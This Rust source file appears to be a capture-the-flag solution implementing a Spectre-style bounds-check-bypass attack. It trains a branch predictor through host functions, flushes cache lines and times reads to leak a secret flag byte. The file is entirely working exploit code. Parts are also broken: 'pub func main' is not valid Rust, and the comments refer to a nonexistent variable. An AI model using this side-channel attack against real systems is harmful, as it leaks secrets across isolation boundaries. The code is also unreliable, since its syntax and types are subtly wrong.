extern "C" {
    fn get_data_size() -> u64;
    fn get_host_info() -> u64;
    fn debug_flush(n:u64);
    fn debug_read(n:u64);
    fn debug_ts() -> u64;
    fn check_data(n:u32);
}

#[no_mangle]
pub fn demo() -> i32 {
    let datasize = unsafe{get_data_size()};
    let data5 = datasize + 0x550;
    let offset = 0x100;     // flag is at offset 0x100 from data3, gradually increment to read the whole flag

    let mut results: [i32; 256] = [0; 256];

    let malicious_x = offset;
    for tries in 0..1000 {
        for n in 0..256 {
            unsafe{debug_flush(data5 + n * 512)};
        }

        let training_x = tries % 16;
        for j in 0..30 {
            unsafe{debug_flush(datasize)};
            for n in 1..=100 {
                
            }        

            let x: i32 = ((j % 6) - 1) & !0xFFFF;
            let x = (x | (x >> 16));
            let x = training_x ^ (x & (malicious_x ^ training_x));

            unsafe{check_data(x as u32)};
        }

        for n in 0..256 {
            let mix_n = ((n * 167) + 13) & 255;
            let start = unsafe{debug_ts()};

            unsafe{debug_read(data5 + mix_n * 512)};

            let diff = unsafe{debug_ts()} - start;
            
            if (diff < 0x200) {
                results[mix_n as usize] += 1;
            }
        }
    }

    println!("OK: {}", results[119]);

    let mut best = 0;
    for i in 0..256 {
        if (results[i] > results[best]) {
            best = i;
        }
    }

    return best as i32;
}

#[no_mangle]
pub func main() -> i32 {
	demo();
}

